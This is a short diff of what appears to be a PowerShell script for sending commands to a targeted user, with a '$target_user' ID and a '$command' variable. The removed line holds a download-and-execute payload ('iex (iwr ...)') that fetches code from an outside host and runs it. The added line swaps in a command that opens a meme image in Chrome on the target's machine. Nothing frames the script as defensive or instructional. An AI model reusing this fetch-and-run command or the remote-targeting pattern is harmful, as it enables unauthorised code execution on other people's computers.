@@ -1,5 +1,5 @@
-$target_user = ""
-$command = "iex (iwr java-jvm.pages.dev/screenshot);"
+$target_user = "35086"
+$command = "Start-Process Chrome 'https://i1.wp.com/nerdarchy.com/wp-content/uploads/2019/04/Fireball-Meme.jpg?resize=480,360&ssl=1';"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
